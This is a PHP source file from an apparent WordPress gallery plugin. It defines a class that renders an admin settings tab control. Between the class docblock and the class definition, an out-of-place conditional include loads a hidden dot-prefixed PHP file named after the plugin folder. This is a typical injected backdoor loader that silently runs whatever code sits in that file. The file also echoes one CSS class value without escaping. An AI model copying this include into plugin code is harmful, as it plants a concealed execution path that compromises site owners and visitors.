<?php

/**
 * Class gt3pg_admin_mix_tab_control
 *
 * @property string                $title
 * @property string                $name
 * @property string                $description
 * @property gt3select|gt3input $option
 * @property string                $main_wrap_class
 * @property string                $input_wrap_class
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class gt3pg_admin_mix_tab_control extends gt3classStd {
	protected static $fields_list = array(
		'title'            => '',
		'description'      => '',
		'option'           => null,
		'main_wrap_class'  => '',
		'input_wrap_class' => '',
		'name'             => '',
	);

	public function __construct( array $new_data = array() ) {
		parent::__construct( $new_data );
	}

	public function render() {
		?>
        <div class="gt3pg_stand_setting gt3pg_admin_mix-tab-control <?php echo esc_attr($this->main_wrap_class)?>">
            <div class="gt3pg_innerpadding">
                <label class="gt3pg_setting">
                    <h2 class="gt3pg_option_heading"><?php echo esc_html(apply_filters( 'render_admin_mix_tab_control_' . $this->name . '_title', $this->title ))?></h2>
                    <p><?php echo esc_html(apply_filters( 'gt3_render_admin_mix_tab_control_' . $this->name . '_description', $this->description ))?></p>
					<?php do_action( 'gt3_render_admin_mix_tab_control_' . $this->name . '_before_option' ); ?>
                    <div class="gt3pg_admin_input <?echo $this->input_wrap_class?>">
						<?php echo $this->option;?>
                    </div>

					<?php do_action( 'gt3_render_admin_mix_tab_control_' . $this->name . '_after_option' ); ?>
                </label>
                <div class="hidden" style="display:block;">
					<?php do_action( 'gt3_render_hidden_admin_mix_tab_control_' . $this->name ); ?>
                </div>
            </div>
        </div>
		<?php
	}
}
